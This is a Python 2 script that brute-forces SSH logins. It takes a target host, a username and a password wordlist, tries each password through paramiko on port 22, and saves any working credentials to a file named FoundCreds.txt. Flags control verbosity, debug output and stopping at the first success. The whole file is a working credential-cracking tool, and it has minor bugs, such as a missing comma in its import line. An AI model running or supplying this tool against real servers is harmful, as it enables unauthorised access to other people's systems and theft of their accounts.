try:
	import paramiko, os sys, socket
except:
	import os
	print("Dependancies: paramiko, os, sys, socket.")
	if raw_input("Install missing dependancies? (Y/n)") == "Y" or raw_input("Install missing dependancies? (Y/n)") == "y" or raw_input("Install missing dependancies? (Y/n)") == "":
		os.system("pip install paramiko")
		os.system("pip install socket")
		os.system("pip install sys")
		exit()
#TODO: Multithreading for faster cracking. 
global host, username, line, input_file
os.system("clear")
f = open("FoundCreds.txt","w")
f.close()
print("\033[1;37;40m")
if "-h" in sys.argv[1:]:
	print("Usage:")
	name = str(sys.argv[0:1])
	name = name.replace("['","")
	name = name.replace("']","")
	print(name+" -h = Display this menu and exit.")
	print(name+" -v = Verbose mode. Display failed authentication and authentication attempts")
	print(name+" -e = Exit on first valid credential pair.")
	print(name+" -d = Debug mode. Display response codes. Best used with -v")
	print("\n All of the above except -h can be used with eachother")
	print("Example: \n"+name+" -v -d")
	print("or \n"+name+" -e -v")
	exit()
if "-v" in sys.argv[1:]:
	Verbose = True
else:
	Verbose = False
if "-d" in sys.argv[1:]:
	Debug = True
else:
	Debug = False
try:
	host = raw_input("[*] Enter Host > ")
	username = raw_input("[*] Enter Username > ")
	input_file = raw_input("[*] Enter Password File > ")
	if os.path.exists(input_file) == False:
		print("\n[*] Error: File path does not exist!")
		sys.exit(4)
except KeyboardInterrupt:
	print("\n[*] Received interupt, shutting down")
	sys.exit(3)
def ssh_connect(password, code = 0):
	ssh = paramiko.SSHClient()
	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
	try:
		ssh.connect(host, port=22, username=username, password=password)
	except paramiko.AuthenticationException:
		#Authentication failure
		code = 1
	except socket.error, e:
		#Host offline or unreachable
		code = 2
	ssh.close()
	return code
inputfile = open(input_file)
print("")
for i in inputfile.readlines():
	password=i.strip("\n")
	try:
		if Verbose == True:
			print("Trying with Username "+username+" and Password "+password)
			print("\n")
		re = str(ssh_connect(password))
		if Debug == True:
			print("Response code: "+re)
		if re == "0":
			print("\033[1;32;40m Success with \n[*]Username: "+username+"\n[*]Password: "+password)
			print("\n")
			print("\033[1;37;40m")
			f = open("FoundCreds.txt","r")
			Contents = f.read()
			f.close()
			f = open("FoundCreds.txt","w")
			f.write("Username: "+username+" Password: "+password)
			f.write("\n"+Contents)
			f.close()
			if "-e" in sys.argv[1:]:
				sys.exit(2)
		elif re == "1":
			if Verbose == True:
				print("Failed authentication with \n[*]Username: "+username+"\n[*]Password: "+password)
				print("\n")
			else:
				pass
		elif re == "2":
			print("[*] Connection could not be established and/or maintained with host.")
			sys.exit(2)
	except Exception, e:
		print e
		pass
inputfile.close()
